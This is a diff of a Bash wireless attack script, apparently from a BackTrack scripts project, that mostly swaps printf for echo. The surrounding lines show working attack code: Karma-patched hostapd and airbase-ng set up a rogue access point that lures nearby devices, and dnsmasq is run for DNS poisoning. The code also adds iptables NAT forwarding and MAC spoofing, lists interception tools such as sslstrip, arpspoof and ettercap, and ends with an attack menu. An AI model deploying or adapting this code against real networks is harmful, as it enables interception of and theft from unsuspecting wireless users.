@@ -146,11 +146,11 @@ echo "# END OF DEBUG MODE AWWWWWWWWWWWW #"
 echo "###################################"
 }
 function injectiontest(){
-printf "[>] Injection Test @ "; DATETIME;
+DATETIME; echo "[>] Injection Test";
 aireplay-ng -9 $MONIFACE > $sessionfolder/logs/injectiontest.log
 sleep 3
 if grep -q 'Injection is working!' $sessionfolder/logs/injectiontest.log; then
-DATETIME; printf "[$OK] Packet Injection Works!";
+DATETIME; echo "[$OK] Packet Injection Works!";
 else
 zenity --error --text "Injection is not working. Reconnect your wireless card and try again."
 echo
@@ -158,7 +158,7 @@ exit
 fi
 }
 function killscript(){
-DATETIME; printf "Detected CTRL+C..."
+DATETIME; echo "Detected CTRL+C..."
 stopshit
 monitormodestop
 cleanup
@@ -169,11 +169,11 @@ trap killscript INT HUP;
 # INTERNET TESTING #
 ####################
 function icmptest(){
-printf "| [ >> ] ICMP TEST @ "; DATETIME;
+echo "| [ >> ] ICMP TEST @ "; DATETIME;
 
 }
 function pinginternet(){
-printf "| [ >> ] WAN ICMP TEST @ "; DATETIME;
+echo "| [ >> ] WAN ICMP TEST @ "; DATETIME;
 INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 3))
 if [ "$INTERNETTEST" = "64" ]; then INTERNET=TRUE;
 WANIP=$(curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+');
@@ -181,28 +181,28 @@ else INTERNET=FALSE; fi
 if [ "$WANIP" != "" ]; then INTERNET=TRUE; else INTERNET=FALSE; fi
 }
 function dnscheck(){
-printf "| [ >> ] DNS TEST @ "; DATETIME;
+echo "| [ >> ] DNS TEST @ "; DATETIME;
 DNSCHECK=$(awk '/bytes from/ { print $1 }' < <(ping raw.github.com -c 1 -w 3))
 if [ "$DNSCHECK" = "64" ]; then DNS=TRUE; else DNS=FALSE; fi
 }
 function pinggateway(){
-printf "[ >> ] GATEWAY ICMP TEST @ "; DATETIME;
+echo "[ >> ] GATEWAY ICMP TEST @ "; DATETIME;
 GATEWAYRDNS=$(awk '/br-lan/ && /UG/ {print $2}' < <(route))
 GATEWAY=$(awk '/br-lan/ && /UG/ { print $2 }' < <(route -n))
-DATETIME; printf "Pinging $GATEWAYRDNS [$GATEWAY] with 64 bytes of data:"
+DATETIME; echo "Pinging $GATEWAYRDNS [$GATEWAY] with 64 bytes of data:"
 GATEWAYTEST=$(awk '/bytes from/ { print $1 }' < <(ping $GATEWAY -c 1 -w 3))
-if [ "$GATEWAYTEST" = "64" ]; then DATETIME; printf "Reply from $GATEWAY: bytes=64"; else DATETIME; printf "Request timed out."; fi
+if [ "$GATEWAYTEST" = "64" ]; then DATETIME; echo "Reply from $GATEWAY: bytes=64"; else DATETIME; echo "Request timed out."; fi
 }
 function pingvictim(){
-DATETIME; printf "Pinging $VICTIMRDNS [$VICTIM] with 64 bytes of data:"
+DATETIME; echo "Pinging $VICTIMRDNS [$VICTIM] with 64 bytes of data:"
 ping $VICTIM -c 20 -W 1 | awk '/bytes from/ { print $5 }'
 }
 function checkupdate(){
-DATETIME; printf " [ >> ] RUNNING SCRIPT UPDATE CHECK                   "
+DATETIME; echo " [ >> ] RUNNING SCRIPT UPDATE CHECK                   "
 newrevision=$(curl -s -B -L https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/VERSION)
 if [ "$newrevision" -gt "$REVISION" ]; then update;
 else
-DATETIME; printf " [$OK] NO UPDATE REQUIRED                             "
+DATETIME; echo " [$OK] NO UPDATE REQUIRED                             "
 echo "+-----------------------------------------------------+";
 fi
 }
@@ -231,35 +231,35 @@ update
 # DEPENDENCY SECTION #
 ######################
 function depends(){
-DATETIME; printf " [ >> ] Dependency Check Started ";
-if [ $UID -eq 0 ]; then DATETIME; printf " [$OK] `id`";
+DATETIME; echo " [ >> ] Dependency Check Started ";
+if [ $UID -eq 0 ]; then DATETIME; echo " [$OK] `id`";
 else
-DATETIME; printf " [$CRIT] Please Run This Script As Root or With Sudo! ";
+DATETIME; echo " [$CRIT] Please Run This Script As Root or With Sudo! ";
 echo "";
 exit 0; fi
 if [ -f $settings ]; then
-DATETIME; printf " [$OK] Config File Found! "; 
-DATETIME; printf " [ >> ] Loading Settings From $settings"
+DATETIME; echo " [$OK] Config File Found! "; 
+DATETIME; echo " [ >> ] Loading Settings From $settings"
 LOADCONF=0; else LOADCONF=0; fi
-if [ "$mydistro" = "BackTrack" ]; then DATETIME; printf " [$OK] $mydistro Version $myversion Release $myrelease "; fi
-if [ "$mydistro" = "Kali" ]; then DATETIME; printf " [$OK] $mydistro Release $myrelease "; fi
-if [ "$mydistro" = "Ubuntu" ]; then DATETIME; printf " [$OK] $mydistro Version $myversion "; fi
-if [ "$INTERNET" = "FALSE" ]; then DATETIME; printf " [$FAIL] No Internet Connection :-( "; fi
-if [ "$INTERNET" = "TRUE" ]; then DATETIME; printf " [$OK] We Have Internet :-) "; dnscheck; fi
-if [ "$ICMPBLOCK" = "TRUE" ]; then DATETIME; printf " [$WARN] Outbound ICMP Ping Is Blocked WAN SIDE ($WANIP) "; fi
-if [ "$DNS" = "FALSE" ]; then DATETIME; printf " [$FAIL] DNS Error Cant Update Check "; fi
-DATETIME; printf " [ >> ] Removing Conflicting Installed Packages!";
+if [ "$mydistro" = "BackTrack" ]; then DATETIME; echo " [$OK] $mydistro Version $myversion Release $myrelease "; fi
+if [ "$mydistro" = "Kali" ]; then DATETIME; echo " [$OK] $mydistro Release $myrelease "; fi
+if [ "$mydistro" = "Ubuntu" ]; then DATETIME; echo " [$OK] $mydistro Version $myversion "; fi
+if [ "$INTERNET" = "FALSE" ]; then DATETIME; echo " [$FAIL] No Internet Connection :-( "; fi
+if [ "$INTERNET" = "TRUE" ]; then DATETIME; echo " [$OK] We Have Internet :-) "; dnscheck; fi
+if [ "$ICMPBLOCK" = "TRUE" ]; then DATETIME; echo " [$WARN] Outbound ICMP Ping Is Blocked WAN SIDE ($WANIP) "; fi
+if [ "$DNS" = "FALSE" ]; then DATETIME; echo " [$FAIL] DNS Error Cant Update Check "; fi
+DATETIME; echo " [ >> ] Removing Conflicting Installed Packages!";
 dpkg -P --force-depends hostapd 2>/dev/null
-DATETIME; printf " [ >> ] Checking For Missing Packages!";
+DATETIME; echo " [ >> ] Checking For Missing Packages!";
 critarray=( aircrack-ng iptables dnsmasq xterm python macchanger wget perl brctl )
 for depend in ${critarray[@]}; do
-type -P $depend &>/dev/null || { DATETIME; printf " [$CRIT] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
+type -P $depend &>/dev/null || { DATETIME; echo " [$CRIT] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
 done
 warnarray=( airdrop-ng arpspoof dpkg driftnet dsniff dhcpd3 dhcpd ettercap hostapd mdk3 msfconsole sslstrip urlsnarf svn nmap )
 for depend in ${warnarray[@]}; do
-type -P $depend &>/dev/null || { DATETIME; printf " [$WARN] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
+type -P $depend &>/dev/null || { DATETIME; echo " [$WARN] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
 done
-DATETIME; printf " [ >> ] Saved To $sessionfolder/logs/missing.log";
+DATETIME; echo " [ >> ] Saved To $sessionfolder/logs/missing.log";
 }
 function uninstalldeps(){
 echo "[>] REMOVING AIRCRACK-NG!";
@@ -272,11 +272,11 @@ cd /usr/src/hostapd-1.0-karma/hostapd;
 make clean &>/dev/null;
 rm -rf /usr/local/bin/hostapd;
 rm -rf /usr/local/bin/hostapd_cli;
-DATETIME; printf "[>] DONE REMOVING DEPS";
+DATETIME; echo "[>] DONE REMOVING DEPS";
 }
 function installdeps(){
-DATETIME; printf "[>] INSTALLING DEPENDS! (internet required)";
-DATETIME; printf "[$WARN] PLEASE ENABLE UNIVERSE IN /etc/apt/sources.list!!!!";
+DATETIME; echo "[>] INSTALLING DEPENDS! (internet required)";
+DATETIME; echo "[$WARN] PLEASE ENABLE UNIVERSE IN /etc/apt/sources.list!!!!";
 sleep 5
 apt-get update;
 apt-get install libssl-dev -y;
@@ -286,38 +286,38 @@ apt-get install libnl-dev -y;
 [ -d "/usr/src/aircrack-ng" ] || installaircrack;
 [ -d "/usr/src/hostapd-1.0-karma" ] || installhostapd;
 installlighttpd;
-DATETIME; printf "[>] DONE INSTALLING DEPS";
+DATETIME; echo "[>] DONE INSTALLING DEPS";
 }
 function installaircrack(){
 dpkg --force-depends --purge aircrack-ng;
-DATETIME; printf "[>] INSTALLING AIRCRACK-NG! (internet required)";
+DATETIME; echo "[>] INSTALLING AIRCRACK-NG! (internet required)";
 cd /usr/src;
 rm -rf aircrack-ng*;
-DATETIME; printf "[>] CHECKING OUT AIRCRACK-NG!";
+DATETIME; echo "[>] CHECKING OUT AIRCRACK-NG!";
 svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng &>/dev/null;
 cd aircrack-ng;
 make uninstall &>/dev/null;
 make clean &>/dev/null;
-DATETIME; printf "[>] STARTING MAKE! (watch for errors)";
+DATETIME; echo "[>] STARTING MAKE! (watch for errors)";
 sleep 5;
 make &>$sessionfolder/logs/aircrack_make.log;
 make install &>$sessionfolder/logs/aircrack_make_install.log;
-DATETIME; printf "[*] LOGS CAN BE FOUND IN $sessionfolder/logs/";
+DATETIME; echo "[*] LOGS CAN BE FOUND IN $sessionfolder/logs/";
 sleep 3;
 airodump-ng-oui-update;
 cd $initpath;
 }
 function installhostapd(){
-DATETIME; printf "[>] INSTALLING HOSTAPD! (internet required)";
+DATETIME; echo "[>] INSTALLING HOSTAPD! (internet required)";
 cd /usr/src;
 wget -a $sessionfolder/logs/wget.log -t 3 -T 10 http://www.digininja.org/files/hostapd-1.0-karma.tar.bz2;
 tar -xf hostapd-1.0-karma.tar.bz2;
 cd hostapd-1.0-karma/hostapd/;
-DATETIME; printf "[>] STARTING MAKE! (watch for errors)";
+DATETIME; echo "[>] STARTING MAKE! (watch for errors)";
 sleep 5;
 make &>$sessionfolder/logs/hostapd_make.log;
 make install &>$sessionfolder/logs/hostapd_make_install.log;
-DATETIME; printf "[*] LOGS CAN BE FOUND IN $sessionfolder/logs/";
+DATETIME; echo "[*] LOGS CAN BE FOUND IN $sessionfolder/logs/";
 sleep 3;
 cd $initpath;
 }
@@ -333,35 +333,35 @@ done
 function stopshit(){
 if [ "$BRLAN" = "up" ]; then brlandown; fi
 pspids;
-DATETIME; printf "Stopping Conflicting Services...";
+DATETIME; echo "Stopping Conflicting Services...";
 servicearray=( lighttpd nginx network-manager dhcp3-server avahi-daemon )
 for service in ${servicearray[@]}; do
-DATETIME; printf "Stopping: $service"; service $service stop &>>$LOG;
+DATETIME; echo "Stopping: $service"; service $service stop &>>$LOG;
 done
-DATETIME; printf "DONE Stopping Services..."
+DATETIME; echo "DONE Stopping Services..."
 while [ -s $sessionfolder/pids/airbase-ng.pid ]; do
 sleep 2;
 pspids;
-DATETIME; printf "Killing Airbase-NG";
+DATETIME; echo "Killing Airbase-NG";
 kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/airbase-ng.pid)` &>/dev/null;
 done
 while [ -s $sessionfolder/pids/hostapd.pid ]; do
 airmon-ng stop mon.$TAPIFACE &>/dev/null;
 sleep 2;
 pspids;
-DATETIME; printf "Killing Hostapd";
+DATETIME; echo "Killing Hostapd";
 kill -9 `awk '{ print $1 }' < <(cat $sessionfolder/pids/hostapd.pid)` &>/dev/null;
 done
 while [ -s $sessionfolder/pids/dnsmasq.pid ]; do
 sleep 2;
 pspids;
-DATETIME; printf "Killing DNSMASQ";
+DATETIME; echo "Killing DNSMASQ";
 kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/dnsmasq.pid)` &>/dev/null;
 done
 while [ -s $sessionfolder/pids/dumpcap.pid ]; do
 sleep 2;
 pspids;
-DATETIME; printf "Killing DUMPCAP";
+DATETIME; echo "Killing DUMPCAP";
 kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/dumpcap.pid)` &>/dev/null;
 done
 for pid in `ls $sessionfolder/pids/*.pid 2>$LOG`; do if [ -s "$pid" ]; then
@@ -614,33 +614,33 @@ fw_init
 # fw_is_loaded && {
 # echo "Firewall already loaded" >&2
 # exit 1
-DATETIME; printf "Loading defaults"
+DATETIME; echo "Loading defaults"
 fw_default
-DATETIME; printf "Loading synflood protection"
+DATETIME; echo "Loading synflood protection"
 fw_synflood
-DATETIME; printf "Loading zones"
+DATETIME; echo "Loading zones"
 fw_zones
-DATETIME; printf "Loading forwardings"
+DATETIME; echo "Loading forwardings"
 fw_wan
-DATETIME; printf "Loading LAN rules"
+DATETIME; echo "Loading LAN rules"
 fw_lan_rules
 if [ "$WANIP" != "" ]; then
-DATETIME; printf "Loading WAN rules"
+DATETIME; echo "Loading WAN rules"
 fw_wan_rules
-DATETIME; printf "Loading redirects"
+DATETIME; echo "Loading redirects"
 fw_natreflection
 fi
-DATETIME; printf "Loading includes"
+DATETIME; echo "Loading includes"
 # fw_includes
 # fw_custom
 fw_logs
-DATETIME; printf "Loading interfaces"
+DATETIME; echo "Loading interfaces"
 fw_interfaces
 echo "1" > /proc/sys/net/ipv4/ip_forward
 }
 function fw_stop(){
 fw_init
-DATETIME; printf "Flushing firewall"
+DATETIME; echo "Flushing firewall"
 iptables --table filter --policy INPUT ACCEPT
 iptables --table filter --policy OUTPUT ACCEPT
 iptables --table filter --policy FORWARD ACCEPT
@@ -721,7 +721,7 @@ iptables --table filter --append syn_flood --jump RETURN -p tcp --syn -m limit -
 iptables --table filter --append syn_flood --jump DROP
 }
 function fw_zones(){
-DATETIME; printf "  Loading Input..."
+DATETIME; echo "  Loading Input..."
 iptables --table filter --append INPUT --jump ACCEPT -m conntrack --ctstate RELATED,ESTABLISHED
 iptables --table filter --append INPUT --jump DROP -m conntrack --ctstate INVALID
 iptables --table filter --append INPUT --jump ACCEPT -i lo
@@ -729,14 +729,14 @@ iptables --table filter --append INPUT --jump syn_flood -p tcp --syn
 iptables --table filter --append INPUT --jump input_rule
 iptables --table filter --append INPUT --jump input
 iptables --table filter -P INPUT ACCEPT
-DATETIME; printf "  Loading Output..."
+DATETIME; echo "  Loading Output..."
 iptables --table filter --append OUTPUT --jump ACCEPT -m conntrack --ctstate RELATED,ESTABLISHED
 iptables --table filter --append OUTPUT --jump DROP -m conntrack --ctstate INVALID
 iptables --table filter --append OUTPUT --jump ACCEPT -o lo
 iptables --table filter --append OUTPUT --jump output_rule
 iptables --table filter --append OUTPUT --jump output
 iptables --table filter -P OUTPUT ACCEPT
-DATETIME; printf "  Loading Forward..."
+DATETIME; echo "  Loading Forward..."
 iptables --table filter --append FORWARD --jump ACCEPT -m conntrack --ctstate RELATED,ESTABLISHED
 iptables --table filter --append FORWARD --jump DROP -m conntrack --ctstate INVALID
 iptables --table filter --append FORWARD --jump forwarding_rule
@@ -879,28 +879,28 @@ iptables --table nat --append POSTROUTING -o $TAPIFACE -s $NETOWRK -d $NETWORK -
 # STARTING SERVICES #
 #####################
 function starthostapd(){
-DATETIME; printf "* STARTING SERVICE: HOSTAPD *"
+DATETIME; echo "* STARTING SERVICE: HOSTAPD *"
 hostapd -dd -f $sessionfolder/logs/hostapd.log -P $sessionfolder/pids/hostapd.pid $sessionfolder/config/hostapd.conf -B
 sleep 7
 }
 function startairbase(){
 modprobe tun
 sleep 2
-DATETIME; printf "* STARTING SERVICE: AIRBASE-NG *";
+DATETIME; echo "* STARTING SERVICE: AIRBASE-NG *";
 airbase-ng -a $ATHIFACEMAC -c $CHAN -x $PPS -I $BEAINT -e $ESSID $MONIFACE -v > $sessionfolder/logs/airbaseng.log &
 sleep 4
 }
 function startkarmaairbase(){
 modprobe tun
 sleep 2
-DATETIME; printf "* STARTING SERVICE: KARMA AIRBASE-NG *";
+DATETIME; echo "* STARTING SERVICE: KARMA AIRBASE-NG *";
 airbase-ng -a $ATHIFACEMAC -c $CHAN -x $PPS -I $BEAINT -e $ESSID $MONIFACE -P -C 15 -v > $sessionfolder/logs/airbaseng.log &
 sleep 4
 }
 function startdnsmasq(){
 echo "no-poll" >> $dnsmasqconf
 echo "no-resolv" >> $dnsmasqconf
-DATETIME; printf "* DNSMASQ DNS POISON!!! *"
+DATETIME; echo "* DNSMASQ DNS POISON!!! *"
 TERMTITLE="DNSMASQ-POISON"
 TERMCMD="dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
 STARTTERM
@@ -908,7 +908,7 @@ tail -F $sessionfolder/logs/dnsmasq.log | awk '/DHCPACK/ && /'$BRLANIFACE'/ {pri
 }
 function startdnsmasqresolv(){
 echo "dhcp-option=wirelesslan,6,8.8.8.8,$TAPIP" >> $dnsmasqconf
-DATETIME; printf "* DNSMASQ With Internet *"
+DATETIME; echo "* DNSMASQ With Internet *"
 TERMTITLE="DNSMASQ-INTERNET"
 TERMCMD="dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
 STARTTERM
@@ -920,7 +920,7 @@ TERMCMD="dhcpd3 -d -f -cf $dhcpconf -pf /var/run/dhcpd/$TAPIFACE.pid $TAPIFACE"
 STARTTERM
 }
 function nodhcpserver(){
-DATETIME; printf "* Not Using A Local DHCP Server *"
+DATETIME; echo "* Not Using A Local DHCP Server *"
 }
 function apachesetup(){
 APACHECONF=/etc/apache2
@@ -933,18 +933,18 @@ ln -s /var/log/apache2/error.log $sessionfolder/logs/error.log
 function apachecheck(){
 apache=$(ps aux|grep "/usr/sbin/apache2"|grep www-data)
 if [[ -z $apache ]]; then
-DATETIME; printf "* Starting Apache2 Web Server *"
+DATETIME; echo "* Starting Apache2 Web Server *"
 /etc/init.d/apache2 start
 sleep 2
 apache=$(ps aux|grep "/usr/sbin/apache2"|grep www-data)
 if [[ -z $apache ]]; then
-DATETIME; printf "* Apache Failed To Start Skipping... *"
+DATETIME; echo "* Apache Failed To Start Skipping... *"
 sleep 4
 else
-DATETIME; printf "* Apache2 Web Server Started *"
+DATETIME; echo "* Apache2 Web Server Started *"
 fi
 else
-DATETIME; printf "Apache2 Was Already Running"
+DATETIME; echo "Apache2 Was Already Running"
 fi
 }
 function responder(){
@@ -1045,7 +1045,7 @@ brctl delbr $BRLANIFACE
 BRLAN=down
 }
 function monitormodestop(){
-DATETIME; printf "* ATTEMPTING TO STOP MONITOR-MODE *"
+DATETIME; echo "* ATTEMPTING TO STOP MONITOR-MODE *"
 if [ "$ATHIFACE" = "" ]; then 
 ATHIFACE=`ifconfig wlan | awk '/encap/ {print $1}'`
 fi
@@ -1059,23 +1059,23 @@ sleep 2
 }
 function monitormodestart(){
 airmon-ng check kill > $sessionfolder/logs/monitormodepslist.log
-DATETIME; printf "* ATTEMPTING TO START MONITOR-MODE ($ATHIFACE) *"
+DATETIME; echo "* ATTEMPTING TO START MONITOR-MODE ($ATHIFACE) *"
 airmon-ng start $ATHIFACE $CHAN > $sessionfolder/logs/monitormode.log
 MONIFACE=`awk '/enabled/ { print $5 }' $sessionfolder/logs/monitormode.log | head -c -2`
 if [ "$SPOOFMAC" != "" ]; then
 macchanger -m $SPOOFMAC $MONIFACE
 fi
 if [ "$MONIFACE" != "" ]; then
-DATETIME; printf ""
-DATETIME; printf "* [$OK] MONITOR MODE ENABLED ON ($MONIFACE) *"
-DATETIME; printf "";
+DATETIME; echo ""
+DATETIME; echo "* [$OK] MONITOR MODE ENABLED ON ($MONIFACE) *"
+DATETIME; echo "";
 else
-DATETIME; printf ""
-DATETIME; printf "* [$FAIL] COULD NOT ENABLE MONITOR MODE ON ($ATHIFACE) *"
-DATETIME; printf "IF YOU THINK THIS IS AN ERROR PLEASE REPORT IT TO"
-DATETIME; printf "THE SCRIPT AUTHOR OR CHECK IF YOUR CARD IS SUPPORTED"
-DATETIME; printf ""
-DATETIME; printf "Script Halting....."
+DATETIME; echo ""
+DATETIME; echo "* [$FAIL] COULD NOT ENABLE MONITOR MODE ON ($ATHIFACE) *"
+DATETIME; echo "IF YOU THINK THIS IS AN ERROR PLEASE REPORT IT TO"
+DATETIME; echo "THE SCRIPT AUTHOR OR CHECK IF YOUR CARD IS SUPPORTED"
+DATETIME; echo ""
+DATETIME; echo "Script Halting....."
 sleep 120
 exit 0; fi
 }
@@ -1588,7 +1588,7 @@ if [ "$attack" = "7" ]; then beaconflood; fi
 if [ "$attack" = "8" ]; then exit 0; fi
 if [ "$attack" = "9" ]; then
 echo ""
-DATETIME; printf "ATEMPTING TO END ATTACK..."
+DATETIME; echo "ATEMPTING TO END ATTACK..."
 stopshit
 brlandown
 monitormodestop
